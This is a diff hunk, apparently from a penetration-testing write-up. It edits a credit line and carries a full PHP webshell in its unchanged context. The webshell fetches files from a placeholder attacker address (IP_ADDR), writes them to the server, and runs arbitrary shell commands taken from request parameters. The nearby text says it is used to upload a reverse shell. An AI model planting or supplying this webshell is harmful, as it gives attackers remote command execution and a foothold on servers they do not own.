@@ -52,7 +52,7 @@ please provide a comma separate list of absolute directory paths: C:\xampp\htdoc
 
 Using that webshell you can upload your reverse shell.
 
-Props to FalconSpy for the small webshell:
+Props to FalconSpy (https://twitter.com/0xfalconspy) for the small webshell:
 ````
 <?php if (isset($_REQUEST[‘fupload’])) { file_put_contents($_REQUEST[‘fupload’], file_get_contents(‘http://IP_ADDR/' . $_REQUEST[‘fupload’])); }; if (isset($_REQUEST[‘fexec’])) { echo ‘<pre>’ . shell_exec($_REQUEST[‘fexec’]) . ‘</pre>’; }; ?>
 ````
